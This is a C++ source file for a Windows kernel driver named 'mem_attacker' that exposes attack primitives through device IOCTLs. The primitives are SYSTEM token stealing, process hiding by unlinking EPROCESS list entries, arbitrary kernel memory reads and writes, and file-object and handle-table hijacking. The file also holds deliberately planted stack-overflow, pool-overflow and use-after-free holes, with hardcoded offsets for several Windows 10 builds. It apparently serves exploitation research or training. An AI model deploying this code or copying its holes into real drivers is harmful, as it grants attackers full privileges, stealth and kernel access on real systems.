// Copyright (c) 2015-2016, tandasat. All rights reserved.
// Use of this source code is governed by a MIT-style license that can be
// found in the LICENSE file.

/// @file
/// Implements an entry point of the driver.

#ifndef POOL_NX_OPTIN
#define POOL_NX_OPTIN 1
#endif
#include "mem_attacker_driver.h"


extern "C" {
////////////////////////////////////////////////////////////////////////////////
//
// macro utilities
//

////////////////////////////////////////////////////////////////////////////////
//
// constants and macros
//

////////////////////////////////////////////////////////////////////////////////
//
// types
//

////////////////////////////////////////////////////////////////////////////////
//
// prototypes
//

DRIVER_INITIALIZE DriverEntry;

static DRIVER_UNLOAD DriverpDriverUnload;

_IRQL_requires_max_(PASSIVE_LEVEL) bool DriverpIsSuppoetedOS();

#if defined(ALLOC_PRAGMA)
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DriverpDriverUnload)
#pragma alloc_text(INIT, DriverpIsSuppoetedOS)
#endif

////////////////////////////////////////////////////////////////////////////////
//
// variables
//

////////////////////////////////////////////////////////////////////////////////
//
// implementations
//



void remove_symbol_link(PWCHAR linkName){
	UNICODE_STRING device_link;
	RtlInitUnicodeString(&device_link, linkName);
	IoDeleteSymbolicLink(&device_link);
}

void remove_control_device(PDRIVER_OBJECT driver_object) {
	PDEVICE_OBJECT device_object = driver_object->DeviceObject;
	while (device_object){
		IoDeleteDevice(device_object);
		device_object = device_object->NextDevice;
	}
}

// Unload handler
_Use_decl_annotations_ static void DriverpDriverUnload(
    PDRIVER_OBJECT driver_object) {
  UNREFERENCED_PARAMETER(driver_object);
  PAGED_CODE();

  remove_symbol_link(MEM_ATTACKER_LINKNAME_APP);
  remove_control_device(driver_object);

  MEM_ATTACKER_LOGGER("The driver has been unloaded, bye.",);
}

// Create-Close handler
_Use_decl_annotations_ NTSTATUS DriverpCreateClose(IN PDEVICE_OBJECT pDeviceObject, IN PIRP  Irp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	PAGED_CODE();

	const auto stack = IoGetCurrentIrpStackLocation(Irp);
	switch (stack->MajorFunction) {
		case IRP_MJ_CREATE: break;
		case IRP_MJ_CLOSE: break;
	}
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}


// Read Write handler
_Use_decl_annotations_ static NTSTATUS DriverpReadWrite(IN PDEVICE_OBJECT pDeviceObject, IN PIRP  Irp){
	PAGED_CODE();

	PVOID buf = NULL;
	auto buf_size = 0;
	// Read size of input buffer 
	const auto stack = IoGetCurrentIrpStackLocation(Irp);
	switch (stack->MajorFunction){
		case IRP_MJ_READ: buf_size = stack->Parameters.Read.Length; break;
		case IRP_MJ_WRITE: buf_size = stack->Parameters.Write.Length; break;
	}
	// Get the address of input buffer
	if (buf_size){
		if (pDeviceObject->Flags & DO_BUFFERED_IO) {
			buf = Irp->AssociatedIrp.SystemBuffer;
		}
		else if (pDeviceObject->Flags & DO_DIRECT_IO) {
			buf = MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
		}
		else {
			buf = Irp->UserBuffer;
		}
	}

	// Do nothing and complete request
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

_Use_decl_annotations_ static void read_param(IN PIRP pIrp, 
	OUT PVOID &inBuf, OUT ULONG &inBufSize, 
	OUT PVOID &outBuf, OUT ULONG &outBufSize){
	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
	inBufSize = stack->Parameters.DeviceIoControl.InputBufferLength;
	outBufSize = stack->Parameters.DeviceIoControl.OutputBufferLength;
	const auto method = stack->Parameters.DeviceIoControl.IoControlCode & 0x03L;
	switch (method)
	{
	case METHOD_BUFFERED:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = pIrp->AssociatedIrp.SystemBuffer;
		break;
	case METHOD_IN_DIRECT:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
		break;
	case METHOD_OUT_DIRECT:
		inBuf = pIrp->AssociatedIrp.SystemBuffer;
		outBuf = MmGetSystemAddressForMdlSafe(pIrp->MdlAddress, NormalPagePriority);
		break;
	case METHOD_NEITHER:
		inBuf = stack->Parameters.DeviceIoControl.Type3InputBuffer;
		outBuf = pIrp->UserBuffer;
		break;
	}
}

//////////////////////////////////////////////////////////////////////////

EPROC_OFFSETS g_EprocOffsets = { 0 }; 

NTSTATUS init_global_vars() {
	NTSTATUS nt_status = STATUS_UNSUCCESSFUL;

	switch (*NtBuildNumber) {
	case 16299: /*   */
				/* BUILDOSVER_STR:  10.0.16299.15.amd64fre.rs3_release.170928-1534 */
		g_EprocOffsets.UniqueProcessId = 0x2e0;
		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
		g_EprocOffsets.Token = 0x358;
		nt_status = STATUS_SUCCESS;
		break;

	case 15063: /*   */
				/* BUILDOSVER_STR:  10.0.15063.0.amd64fre.rs2_release.170317-1834 */
		g_EprocOffsets.UniqueProcessId = 0x2e0;
		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
		g_EprocOffsets.Token = 0x358;
		nt_status = STATUS_SUCCESS;
		break;
	case 14393: /* Win10_1607_SingleLang_English_x64 */
		/*  BUILDOSVER_STR:  10.0.14393.0.amd64fre.rs1_release.160715-1616  */
		g_EprocOffsets.UniqueProcessId = 0x2e8;
		g_EprocOffsets.ActiveProcessLinks = 0x2f0;
		g_EprocOffsets.Token = 0x358;
		nt_status = STATUS_SUCCESS;
		break;
	case 18362:	/*   Windows 10 Kernel Version 18362 MP (1 procs) Free x64 */
		/*   BUILDOSVER_STR:  10.0.18362.1.amd64fre.19h1_release.190318-1202   */
		g_EprocOffsets.UniqueProcessId = 0x2e8;
		g_EprocOffsets.ActiveProcessLinks = 0x2f0;
		g_EprocOffsets.Token = 0x360;
		nt_status = STATUS_SUCCESS;
		break;
	case 17763:	/*   Windows 10 Win10_1809Oct_v2_English_x64 */
				/*   BUILDOSVER_STR:  10.0.17763.1.amd64fre.rs5_release.180914-1434   */
		g_EprocOffsets.UniqueProcessId = 0x2e0;
		g_EprocOffsets.ActiveProcessLinks = 0x2e8;
		g_EprocOffsets.Token = 0x358;
		nt_status = STATUS_SUCCESS;
		break;

	default:
		g_EprocOffsets = { 0 };
		nt_status = STATUS_UNSUCCESSFUL;
		break;
	};
	return nt_status;
}

void SecurRemoveEntryList(_In_ PLIST_ENTRY Entry){
	if (Entry){
		PLIST_ENTRY PrevEntry = Entry->Blink;
		PLIST_ENTRY NextEntry = Entry->Flink;;
		if (NextEntry && PrevEntry) {
			if ((NextEntry->Blink != Entry) || 
				(PrevEntry->Flink != Entry)) {
				FatalListEntryError((PVOID)PrevEntry,
					(PVOID)Entry,
					(PVOID)NextEntry);
			}
			PrevEntry->Flink = NextEntry;
			NextEntry->Blink = PrevEntry;
		}
	}
}

void hide_proc(const ULONG64 targetPID) {
	PEPROCESS target_proc = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
		MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);

		SecurRemoveEntryList((PLIST_ENTRY)((char*)target_proc + g_EprocOffsets.ActiveProcessLinks));

		MEM_ATTACKER_LOGGER("has unlinked the struct to hide process %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		DbgPrint("\r\n\r\n");

		if (target_proc) {
			ObDereferenceObject(target_proc);
		}
	}
	return;

// 	PLIST_ENTRY current_apl = (PLIST_ENTRY)((char*)PsInitialSystemProcess + g_EprocOffsets.ActiveProcessLinks);
// 	const PLIST_ENTRY begin_apl = current_apl;
// 
// 	ULONG64 curret_pid = 0;
// 	do {
// 		curret_pid = *(ULONG64*)((char*)current_apl -
// 			g_EprocOffsets.ActiveProcessLinks +
// 			g_EprocOffsets.UniqueProcessId);
// 		if (targetPID == curret_pid) {
// 			MEM_ATTACKER_LOGGER("founds the EPROCESS struct for the %s:%d,",
// 				PsGetProcessImageFileName((PEPROCESS)((char*)current_apl - g_EprocOffsets.ActiveProcessLinks)),
// 				targetPID);
// 			SecurRemoveEntryList(current_apl);
// 			MEM_ATTACKER_LOGGER("unlinks the struct to hide process %s:%d.",
// 				PsGetProcessImageFileName((PEPROCESS)((char*)current_apl - g_EprocOffsets.ActiveProcessLinks)),
// 				targetPID);
// 			DbgPrint("\r\n\r\n");
// 			break;
// 		}
// 		current_apl = current_apl->Flink;
// 	} while (begin_apl != current_apl);
}

void set_privs(const ULONG64 targetPID) {
	
	ULONG64 system_token = *(ULONG64*)((char*)PsInitialSystemProcess + g_EprocOffsets.Token);
		
	PEPROCESS target_proc = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)targetPID, &target_proc))) {
		MEM_ATTACKER_LOGGER("has found the EPROCESS struct for the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		__try {
			*(ULONG64*)((char*)target_proc + g_EprocOffsets.Token) = system_token;
		}
		__except (EXCEPTION_EXECUTE_HANDLER) {   };
		MEM_ATTACKER_LOGGER("has set the highest privileges to the %s:%d",
			PsGetProcessImageFileName(target_proc),
			targetPID);
		DbgPrint("\r\n\r\n");

		if (target_proc) {
			ObDereferenceObject(target_proc);
		}
	}
}

bool copy_fileobj_fields(FILE_OBJECT * src, FILE_OBJECT * dst) {
	bool b_res = false;
	if (src && dst){
		__try {
			if (src->Vpb && src->FsContext && src->FsContext2 && src->SectionObjectPointer) {
				dst->Vpb = src->Vpb;
				dst->FsContext = src->FsContext;
				dst->FsContext2 = src->FsContext2;
				dst->SectionObjectPointer = src->SectionObjectPointer;
				b_res = true;
			}
		}
		__except (EXCEPTION_EXECUTE_HANDLER)   {   b_res = false;   }
	}
	return b_res;
}

const int g_ObjectPointerBitsOffset = (OBJECTPOINTERBITS_OFFSET);
const int  g_ObjectPointerBitsSz = (OBJECTPOINTERBITS_SIZE);
//char g_ObjectPointerBits[g_ObjectPointerBitsSz] = { 0 };

#define EX_ADDITIONAL_INFO_SIGNATURE (ULONG_PTR)(-2)

#define ExpIsValidObjectEntry(Entry) \
    ( (Entry != NULL) && (Entry->LowValue != 0) && (Entry->HighValue != EX_ADDITIONAL_INFO_SIGNATURE) )

/*
1.247 InterlockedExchangeAdd
The InterlockExchangeAdd function performs an atomic addition of an increment value to an addend variable. The
function prevents more than one thread from using the same variable simultaneously.

Remarks
The functions InterlockedExchangeAdd, InterlockedCompareExchange, InterlockedDecrement, 
InterlockedExchange, and InterlockedIncrement provide a simple mechanism for synchronizing access to a
variable that is shared by multiple threads. The threads of different processes can use this mechanism if the variable is
in shared memory.
The InterlockedExchangeAdd function performs an atomic addition of the Increment value to the value pointed to
by Addend. The result is stored in the address specified by Addend. The initial value of the variable pointed to by
Addend is returned as the function value.
The variables for InterlockedExchangeAdd must be aligned on a 32-bit boundary; otherwise, this function will fail
on multiprocessor x86 systems and any non-x86 systems.
*/

/* Implement _InterlockedExchangeAdd8 in terms of _InterlockedCompareExchange8 */
// static __inline char
// _InterlockedExchangeAdd8(char volatile *Addend, char Value)
// {
// 	char Initial = *Addend;
// 	char Comparand;
// 	do {
// 		char Exchange = Initial + Value;
// 		Comparand = Initial;
// 		Initial = _InterlockedCompareExchange8(Addend, Exchange, Comparand);
// 	} while (Initial != Comparand);
// 	return Comparand;
// }
//
// lock inc byte ptr [rax] ds:002b:ffff8a80`09c67c20=fe
//

VOID
ExUnlockHandleTableEntry(
	__inout PHANDLE_TABLE HandleTable,
	__inout PHANDLE_TABLE_ENTRY HandleTableEntry
) {
	// Release implicit locks, the function ExUnlockHandleTableEntry() - is unresolved 
	_InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
	if (HandleTable != NULL && HandleTable->HandleContentionEvent)
		ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
}

typedef struct _HandleTableHijacker{
	HANDLE hijackerHandle;
	void * targetFileObjectHeader;
}HandleTableHijacker, *PHandleTableHijacker;

/// <summary>
/// Handle enumeration callback
/// </summary>
/// <param name="HandleTable">Process handle table</param>
/// <param name="HandleTableEntry">Handle entry</param>
/// <param name="Handle">Handle value</param>
/// <param name="EnumParameter">User context</param>
/// <returns>TRUE when desired handle is found</returns>
BOOLEAN walkthrough_handle_table_and_patch(
	IN PHANDLE_TABLE HandleTable,
	IN PHANDLE_TABLE_ENTRY HandleTableEntry,
	IN HANDLE Handle,
	IN PVOID EnumParameter
) {
	UNREFERENCED_PARAMETER(HandleTable);
	BOOLEAN result = FALSE;
	if (HandleTableEntry){
		if (EnumParameter != NULL) {
			PHandleTableHijacker hijacker_param = (PHandleTableHijacker)EnumParameter;
			if (Handle == hijacker_param->hijackerHandle) {
				if (ExpIsValidObjectEntry(HandleTableEntry)) {
					DbgPrint("The hijacker handle table entry is found.\r\n");
					DbgPrint("Checking handle table entry..\r\n");
					
					char *addr = ((char*)HandleTableEntry + g_ObjectPointerBitsOffset);
					int zeros = 0;
					// check hijacked handle table entry 
					for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
						if (addr[i] == 0)   {
							zeros++;
						}
					}
					if (zeros != g_ObjectPointerBitsSz){
						// change the hijacked handle table entry to the target object header
						DbgPrint("Patching handle table entry..\r\n");
						for (int i = 0; i < g_ObjectPointerBitsSz; i++) {
							addr[i] = ((char*)&hijacker_param->targetFileObjectHeader)[i];
						}
						result = TRUE;
					}
				}
				
			}
		}
	}
	
	//ExUnlockHandleTableEntry(HandleTable, HandleTableEntry);

	// Release implicit locks
	_InterlockedExchangeAdd8((char*)&HandleTableEntry->VolatileLowValue, 1);  // Set Unlocked flag to 1
	if (HandleTable != NULL && HandleTable->HandleContentionEvent)
		ExfUnblockPushLock(&HandleTable->HandleContentionEvent, NULL);
	return result;
}

bool get_object_header_by_handle(HANDLE targetFileHandle, void* & targetObjectHeader) {
	PFILE_OBJECT targetFileObject = NULL;
	NTSTATUS nt_status = ObReferenceObjectByHandle(targetFileHandle, FILE_ALL_ACCESS,
		*IoFileObjectType, KernelMode, (PVOID *)&targetFileObject, NULL);
	if (NT_SUCCESS(nt_status)) {
		targetObjectHeader = (void*)((char*)targetFileObject - 0x30);
		DbgPrint("The target OBJECT_HEADER is here [%I64X].\r\n", targetObjectHeader);
		if (targetFileObject) { ObDereferenceObject(targetFileObject); }
	}
	return NT_SUCCESS(nt_status);
}

bool hijack_handle_table(HANDLE hijackerHandle, void* targetObjectHeader) {
	bool b_res = false;
	const HANDLE system_pid = (HANDLE)4;
	PEPROCESS system_eprocess = NULL;
	if (NT_SUCCESS(PsLookupProcessByProcessId(system_pid, &system_eprocess))) {
		DbgPrint("Looking for the handle table entry..\r\n");

		PHANDLE_TABLE pTable = *(PHANDLE_TABLE*)((char*)system_eprocess + 0x418 /*dynData.ObjTable*/);
		HandleTableHijacker table_hijacker = { 0 };
		table_hijacker.hijackerHandle = (ObKernelHandleToHandle(hijackerHandle)); //hijackerHandle = ObMarkHandleAsKernelHandle(hijackerHandle);
		table_hijacker.targetFileObjectHeader = targetObjectHeader;
		if (TRUE == ExEnumHandleTable(pTable, &walkthrough_handle_table_and_patch, &table_hijacker, NULL)) {
			b_res = true;
			DbgPrint("+ hijacking success! \r\n");
		}
		else { DbgPrint("- hijacking failed! \r\n"); }

		if (system_eprocess) { ObDereferenceObject(system_eprocess); }
	}
	return b_res;
}

// IOCTL dispatch handler
_Use_decl_annotations_ static NTSTATUS DriverpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp) {
	UNREFERENCED_PARAMETER(pDeviceObject);
	PAGED_CODE();
	static zwfile::FileWriter fw_open_file;
	static FILE_OBJECT fo_backup_copy = { 0 };
	const auto stack = IoGetCurrentIrpStackLocation(pIrp);
	PVOID in_buf = NULL, out_buf = NULL;
	ULONG in_buf_sz = 0, out_buf_sz = 0;
	auto status = STATUS_INVALID_PARAMETER;
	ULONG_PTR info = 0;
	read_param(pIrp, in_buf, in_buf_sz, out_buf, out_buf_sz);
	switch (stack->Parameters.DeviceIoControl.IoControlCode)
	{
	case MEM_ATTACKER_TOKEN_STEALING:
		if (in_buf_sz == sizeof ULONG64) {
			ULONG64 pid = 0;
			ULONG64* pdata = (ULONG64*)in_buf;
			__try {
				pid = *pdata;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) { pid = 0; }
			if (pid) {
				set_privs(pid);
			}
		}
		break;

	case MEM_ATTACKER_HIDE_PROCESS:
		if (in_buf_sz == sizeof ULONG64) {
			ULONG64 pid = 0;
			ULONG64* pdata = (ULONG64*)in_buf;
			__try {
				pid = *pdata;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) { pid = 0; }
			if (pid) {
				hide_proc(pid);
			}
		}
		break;

	case MEM_ATTACKER_READ_1_BYTE:
		if (in_buf_sz == sizeof ADDR_BYTE) {
			ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
			__try {
				pdata->value = *(char*)pdata->addr;
				MEM_ATTACKER_LOGGER("reads 1 byte %01X from memory 0x%I64X.",
					pdata->value, pdata->addr);
				DbgPrint("\r\n\r\n");
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {   }
		}
		break;

	case MEM_ATTACKER_WRITE_1_BYTE:
		if (in_buf_sz == sizeof ADDR_BYTE) {
			ADDR_BYTE* pdata = (ADDR_BYTE*)in_buf;
			__try {
				*(char*)pdata->addr = pdata->value;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {   }
			MEM_ATTACKER_LOGGER("writes 1 byte %01X to memory 0x%I64X.",
				pdata->value, pdata->addr);
			DbgPrint("\r\n\r\n");
		}
		break;

	case MEM_ATTACKER_READ_CHAR_DATA:
		if (in_buf_sz == sizeof ALLOCATED_DATA) {
			ALLOCATED_DATA *data = (ALLOCATED_DATA*)in_buf;
			if (data && data->address && data->content) {
				RtlCopyMemory(data->content, data->address, sizeof data->content);
				MEM_ATTACKER_LOGGER("reads  \"%s\"  from the memory 0x%I64X.", data->content, data->address);
			}
		}
		break;

	case MEM_ATTACKER_WRITE_CHAR_DATA:
		if (in_buf_sz == sizeof ALLOCATED_DATA) {
			ALLOCATED_DATA *data = (ALLOCATED_DATA*)in_buf;
			if (data && data->address && data->content) {
				RtlCopyMemory(data->address, data->content, sizeof data->content);
				MEM_ATTACKER_LOGGER("writes  \"%s\"  to the memory 0x%I64X.", data->content, data->address);
			}
		}
		break;
	//////////////////////////////////////////////////////////////////////////

	case MEM_ATTACKER_CREATE_FILE:	zwfile::zw_create_file(in_buf_sz, in_buf); break;

	case MEM_ATTACKER_OPEN_ONLY:	zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf); break;

	case MEM_ATTACKER_READ_FILE:	zwfile::zw_read_file(fw_open_file, in_buf_sz, in_buf); break;

	case MEM_ATTACKER_WRITE_FILE:	zwfile::zw_write_file(fw_open_file, in_buf_sz, in_buf); break;

	case MEM_ATTACKER_CLOSE_FILE: 
	{
		if (fo_backup_copy.Vpb || 
			fo_backup_copy.FsContext ||
			fo_backup_copy.FsContext2 ||
			fo_backup_copy.SectionObjectPointer){
			// Restore fields in temporary FILE_OBJECT after hijacking
			FILE_OBJECT * a_file_obj = (FILE_OBJECT *)fw_open_file.get_object();
			copy_fileobj_fields(&fo_backup_copy, a_file_obj);
		}
		// Close the temporary file
		fw_open_file.close(); 
		break;
	}

	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ:
		// 1. Create and open a tmp-file
		zwfile::zw_open_file(fw_open_file, in_buf_sz, in_buf);
		if (in_buf_sz == sizeof OPEN_THE_FILE) {
			OPEN_THE_FILE *file = (OPEN_THE_FILE*)in_buf;
			if (file && NT_SUCCESS(file->status)){
				//2. Backup fields of temporary FILE_OBJECT 
				FILE_OBJECT * tmp_file_obj = (FILE_OBJECT *)fw_open_file.get_object();
				copy_fileobj_fields(tmp_file_obj, &fo_backup_copy);

				//3. Copy fields from target FILE_OBJECT to the temporary FILE_OBJECT
				//   to hijack the target file
				FILE_OBJECT * target_obj = (FILE_OBJECT *)file->target_object;
				file->is_hijacking_ok = copy_fileobj_fields(target_obj, tmp_file_obj);

				file->handle = fw_open_file.get_handle();
				file->object = fw_open_file.get_object();
			}
		}
		break;

	case MEM_ATTACKER_OPEN_BY_HIJACKING_FILEHANDLE:
		if (in_buf_sz == sizeof HIJACKING_HANDLE_TABLE) {
			// 1. Create and open a tmp-file
			PHIJACKING_HANDLE_TABLE file = (PHIJACKING_HANDLE_TABLE)in_buf;
			if (zwfile::zw_open_file(fw_open_file, sizeof file->file_hijacker, &file->file_hijacker)) {
				void* target_file_object_header = NULL;
				if (get_object_header_by_handle(file->target_file_handle, target_file_object_header) && 
					hijack_handle_table(file->file_hijacker.handle, target_file_object_header)) {
					file->file_hijacker.is_hijacking_ok = true;
				}
			}
		}
		break;
	case MEM_ATTACKER_HIJACK_PRIVS:
		if (in_buf_sz == sizeof HIJACK_PRIVS_DATA){
			PHIJACK_PRIVS_DATA p_data = (PHIJACK_PRIVS_DATA)in_buf;
			if (p_data && p_data->processID){
				p_data->is_privs_hijacking_ok =					
					token_hijacking::hijacking(p_data->processID);
			}
		}
		break;

	//////////////////////////////////////////////////////////////////////////
	case MEM_ATTACKER_WRITE_8_BYTES:
		if (in_buf_sz == sizeof ADDR_8BYTES) {
			ADDR_8BYTES* pdata = (ADDR_8BYTES*)in_buf;
			__try {
				*(ULONG64*)pdata->addr = pdata->value;
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {   }
			MEM_ATTACKER_LOGGER("writes 8 bytes %08X to memory 0x%I64X.",
				pdata->value, pdata->addr);
			DbgPrint("\r\n\r\n");
		}
		break;
	case MEM_ATTACKER_SIMPLE_STACK_OVERFLOW:
		status = vulnerable_code::stack_overflow_stub(in_buf, in_buf_sz);
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_SIMPLE_POOL_OVERFLOW:
		status = vulnerable_code::pool_overflow_stub(in_buf, in_buf_sz);
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_ALLOCATE_OBJECT:
		status = vulnerable_code::uaf_allocate_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_FREE_OBJECT:
		status = vulnerable_code::uaf_free_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_USE_OBJECT:
		status = vulnerable_code::uaf_use_object_stub();
		info = in_buf_sz;
		break;
	case MEM_ATTACKER_UAF_ALLOCATE_FAKE:
		status = vulnerable_code::uaf_allocate_fake_stub(in_buf);
		info = in_buf_sz;
		break;
	default: {}
	}

	pIrp->IoStatus.Information = info;
	pIrp->IoStatus.Status = status;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

// Test if the system is one of supported OS versions
_Use_decl_annotations_ bool DriverpIsSuppoetedOS() {
  PAGED_CODE();

  RTL_OSVERSIONINFOW os_version = {};
  auto status = RtlGetVersion(&os_version);
  if (!NT_SUCCESS(status)) {
    return false;
  }

  if (os_version.dwBuildNumber != 15063){
	  return false;
  }

  // 4-gigabyte tuning (4GT) should not be enabled
  if (!IsX64() &&
      reinterpret_cast<ULONG_PTR>(MmSystemRangeStart) != 0x80000000) {
    return false;
  }
  return true;
}

_Use_decl_annotations_ NTSTATUS create_device(IN PDRIVER_OBJECT pDrv, ULONG uFlags, PWCHAR devName, PWCHAR linkName)
{
	UNICODE_STRING dev_name = { 0 }, link_name = {0};
	RtlInitUnicodeString(&dev_name, devName);
	RtlInitUnicodeString(&link_name, linkName);

	PDEVICE_OBJECT pDev;
	auto status = IoCreateDevice(pDrv, 0 /* or sizeof(DEVICE_EXTENSION)*/, &dev_name, 65500, 0, 0, &pDev);

	if (NT_SUCCESS(status)) {
		pDev->Flags |= uFlags;
		IoDeleteSymbolicLink(&link_name);
		status = IoCreateSymbolicLink(&link_name, &dev_name);
	}
	else   {   IoDeleteDevice(pDev);   }

	return status;
}

#include "intrin.h"
static const unsigned long SMEP_MASK = 0x100000;

void print_smep_status() {
	bool b_active = false;
	KAFFINITY active_processors = KeQueryActiveProcessors();
	for (KAFFINITY current_affinity = 1; active_processors; current_affinity <<= 1) {
		if (active_processors & current_affinity) {
			active_processors &= ~current_affinity;
			KeSetSystemAffinityThread(current_affinity);
			b_active = (0 != (__readcr4() & SMEP_MASK));

			MEM_ATTACKER_LOGGER("%s on CPU %d \r\n",
				b_active ? "SMEP is active" : "SMEP has been disabled",
				KeGetCurrentProcessorNumber() );
		}
	}
}

// A driver entry point
_Use_decl_annotations_ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object,
	PUNICODE_STRING registry_path) {
	UNREFERENCED_PARAMETER(registry_path);
	PAGED_CODE();
	
	MEM_ATTACKER_LOGGER("has been loaded to the %I64X-%I64X ",
		driver_object->DriverStart, (char*)driver_object->DriverStart+ driver_object->DriverSize);

	if (!NT_SUCCESS(init_global_vars())){
		return STATUS_CANCELLED;
	}

	// Test if the system is supported
// 	if (!DriverpIsSuppoetedOS()) {
// 		return STATUS_CANCELLED;
// 	}

//	print_smep_status();

	driver_object->DriverUnload = DriverpDriverUnload;
	driver_object->MajorFunction[IRP_MJ_CREATE] =
	driver_object->MajorFunction[IRP_MJ_CLOSE] = DriverpCreateClose;
	driver_object->MajorFunction[IRP_MJ_READ] =
	driver_object->MajorFunction[IRP_MJ_WRITE] = DriverpReadWrite;
	driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverpDeviceControl;

	auto nt_status = create_device(driver_object, NULL, MEM_ATTACKER_DEVICENAME_DRV, MEM_ATTACKER_LINKNAME_DRV);

	return nt_status;
}

}  // extern "C"
